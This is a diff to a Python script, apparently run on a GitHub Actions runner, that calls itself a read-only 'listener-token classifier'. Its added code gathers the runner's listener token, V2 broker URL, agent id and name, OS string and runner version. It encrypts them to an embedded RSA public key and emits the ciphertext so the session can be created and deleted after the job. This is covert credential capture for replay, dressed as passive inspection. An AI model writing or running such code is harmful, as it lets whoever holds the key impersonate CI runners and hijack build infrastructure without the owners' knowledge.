@@ -1,12 +1,13 @@
-"""Bounded T4 listener-token post-job revocation classifier for Meta LHE.
+"""Bounded T4 listener-token post-job session classifier for Meta LHE.
 
 The script performs local read-only classification of the HCA and Actions
 Runner listener authority. JWTs are decoded only in memory and only claim
 names, type classes and selected boolean values are emitted. The current
-disposable runner's listener token and V2 broker URL are encrypted in memory to
-a one-time RSA public key for a post-job invalid-session GET. Only ciphertext
-is emitted; no raw credential, URL, address, hostname, identifier, or body is
-emitted, and this on-runner stage makes no network request.
+disposable runner's listener token, V2 broker URL and current runner identity
+are encrypted in memory to a one-time RSA public key for a post-job session
+create/delete check. Only ciphertext is emitted; no raw credential, URL,
+address, hostname, identifier, or body is emitted, and this on-runner stage
+makes no network request.
 """
 
 from __future__ import annotations
@@ -17,6 +18,7 @@ import http.client
 import ipaddress
 import json
 import os
+import platform
 import re
 import secrets
 import ssl
@@ -33,15 +35,15 @@ from urllib.parse import parse_qs, urlencode, urlsplit
 
 MARKER = "META_LHE_FAIRCHEM_T4_PASSIVE"
 LISTENER_REPLAY_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
-MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAvf+xRALY8tT0O5FP5Wns
-6HpqNkKO4Xiw3CBeXZHwIOlcfsI8OSyeELXiuz9xsQeJ/881/LiL32nP8wP56TiS
-MqLZ0Sgu+WFisf/2QHPoHfYe4vWJzmtRSjnAsztG3j4oNIZ5qX8+pBscP5rOGZXm
-/Pe5M+kN6hmMzk8TFTuTg+qY0QC5eWL0IcS1IpixKcAor265w2CJEnqscZ/BsTYv
-L380AHIJ30U5JnDjz6TEgMAnaXL12EebJgAc2BE12H5WWt7JgGvf3Y1dw2qCSEe4
-ZyTdGT/3MNd7u46uDXCqLjPSMTWbo6U9awpVVsdtPtdLw6rOpXj9reo+gB7WYNqB
-Ha3qAo8BCpCPiPkUsHpChZ6URSQgkFxPNQNrxrFDZkMkD1+Dh33mbzkb6epFika0
-UdgmQFyhVK3y6YJnPfL2TC/4rFu/6QxPdsrP3sACI+tbkrVVjSQ16EO0PfMEGJeX
-XAwKYsxoHaR00TTphe/csDM3mtXCQIeQ6SVpSiNV5HE5AgMBAAE=
+MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA1qSmMQZ7iKXUUq/qbDlR
+ich0a/904YuQlyL0nwGBkD0DT4+Tv7GYyu0R0XkDv67fTLieg6Vw2P9O91yo5hT9
+zZjy2+oTP7SFAlJjYZXSFlC3TZ1noUF2eGnp7LJIN0xSYZv+u/d3fzXzTTonNBbq
+nLN1crI1EQJhzy36S1k4FZbU3W6hwuiA5mtISSQ3EvosdebfzxEOKTEC9lEwPBKm
+4uvtDOHtk7Jj4fahWnzT5Ubi4ycaXvy+Q9pyo0TWCtsmRnaaZcF4SccATeimgQG2
+tyOX0jc+R0aDEJHGB/Ui28sexbFwmX6q5J3rVo0MR12Ub3Uqxgeo/IpzS5Ss2/hK
+990w8sXm074LfS3VJ8dwvUr8aBarhOCHf+kJ6hh2P7WrbVaIY7GSxHluxRZhwYnv
+kQLWhYPaIkh6LSZPGez3A7rbt71/eR5ceyFFIK24eGaRq89IMLKag7Dp0CcReQEP
+95eESkoriP/Ym6hKNVCFpFxsRb6VVFwSU7E3V/JysyxZAgMBAAE=
 -----END PUBLIC KEY-----
 """
 MAX_TEXT_FILE = 2 * 1024 * 1024
@@ -972,6 +974,8 @@ def capture_listener_replay_material_encrypted() -> bool:
         return False
     token = case_get(case_get(credentials, "data"), "token")
     server_url = case_get(runner, "ServerUrlV2")
+    agent_id = case_get(runner, "AgentId")
+    agent_name = case_get(runner, "AgentName")
     scheme = case_get(credentials, "scheme")
     if not isinstance(server_url, str):
         emit("listener_replay_capture_preconditions_met", False)
@@ -988,13 +992,43 @@ def capture_listener_replay_material_encrypted() -> bool:
         and parsed.port in (None, 443)
         and endpoint_class["host_suffix_class"] == "github_actions_content"
         and len([segment for segment in parsed.path.split("/") if segment]) == 0
+        and isinstance(agent_id, int)
+        and agent_id > 0
+        and isinstance(agent_name, str)
+        and 0 < len(agent_name) <= 256
     )
     emit("listener_replay_capture_preconditions_met", preconditions)
     if not preconditions or not isinstance(token, str):
         return False
 
+    try:
+        version_result = subprocess.run(
+            [str(executable), "--version"],
+            cwd=config_root,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+            check=True,
+            timeout=10,
+            text=True,
+        )
+        runner_version = version_result.stdout.strip()
+    except (OSError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
+        emit("listener_replay_capture_runner_version_succeeded", False)
+        return False
+    if not re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+", runner_version):
+        emit("listener_replay_capture_runner_version_succeeded", False)
+        return False
+    emit("listener_replay_capture_runner_version_succeeded", True)
+
     payload = json.dumps(
-        {"server_url": server_url, "token": token},
+        {
+            "agent_id": agent_id,
+            "agent_name": agent_name,
+            "os_description": platform.platform(),
+            "runner_version": runner_version,
+            "server_url": server_url,
+            "token": token,
+        },
         sort_keys=True,
         separators=(",", ":"),
     ).encode("utf-8")
@@ -1837,7 +1871,7 @@ def inspect_environment_names() -> None:
 
 
 def main() -> int:
-    emit("schema", "v6")
+    emit("schema", "v7")
     emit("effective_uid_zero", os.geteuid() == 0)
     inspect_hca()
     inspect_runner_listener_authority()
